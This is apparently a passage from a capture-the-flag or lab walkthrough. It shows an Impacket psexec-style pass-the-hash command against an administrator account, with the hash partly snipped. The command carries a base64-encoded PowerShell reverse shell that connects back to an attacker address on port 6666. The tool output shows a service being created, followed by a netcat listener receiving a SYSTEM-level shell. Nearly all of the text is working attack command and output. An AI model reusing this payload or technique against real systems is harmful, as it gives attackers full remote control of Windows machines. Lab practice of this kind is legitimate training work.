.\ps.exe -hashes :f7<--- SNIP --->9b administrator@127.0.0.1 "cmd /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwA5ACIALAA2ADYANgA2ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
Cannot determine Impacket version. If running from source you should at least run "python setup.py egg_info"
Impacket v? - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 127.0.0.1.....
[*] Found writable share ADMIN$
[*] Uploading file RntAIAVY.exe
[*] Opening SVCManager on 127.0.0.1.....
[*] Creating service ufka on 127.0.0.1.....
[*] Starting service ufka.....
#< CLIXML
```

```c
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 6666
listening on [any] 6666 ...
connect to [10.10.16.39] from (UNKNOWN) [10.10.11.251] 49848

PS C:\Windows\system32> whoami
nt authority\system
```
